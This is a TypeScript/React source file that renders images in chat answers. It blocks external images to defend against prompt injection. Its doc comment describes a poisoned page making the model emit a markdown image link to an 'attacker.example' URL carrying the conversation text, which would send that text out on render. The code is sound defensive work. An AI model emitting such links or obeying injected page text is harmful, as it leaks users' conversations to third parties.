import type { ComponentProps } from "react";

/**
 * Chat answers are generated from page text, so a poisoned page could make
 * the model emit `![](https://attacker.example/?d=<conversation text>)`. A
 * browser would fetch it as soon as the answer renders, sending the
 * conversation (possibly sensitive) to a third party. Chat therefore loads
 * only same-origin and inline images; anything else becomes inert text.
 */
export function isChatImageAllowed(src: string | undefined, origin = typeof window === "undefined" ? undefined : window.location.origin) {
  if (!src) return false;
  if (!/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(src)) return true; // relative to this site
  if (/^data:image\//i.test(src)) return true;
  if (!origin) return false;
  try {
    return new URL(src, origin).origin === origin;
  } catch {
    return false;
  }
}

export function ChatImage({ loading = "lazy", decoding = "async", ...props }: ComponentProps<"img">) {
  if (!isChatImageAllowed(typeof props.src === "string" ? props.src : undefined)) {
    return <span className="text-xs text-[var(--text-muted)]">[external image blocked{props.alt ? `: ${props.alt}` : ""}]</span>;
  }
  return <img loading={loading} decoding={decoding} {...props} />;
}
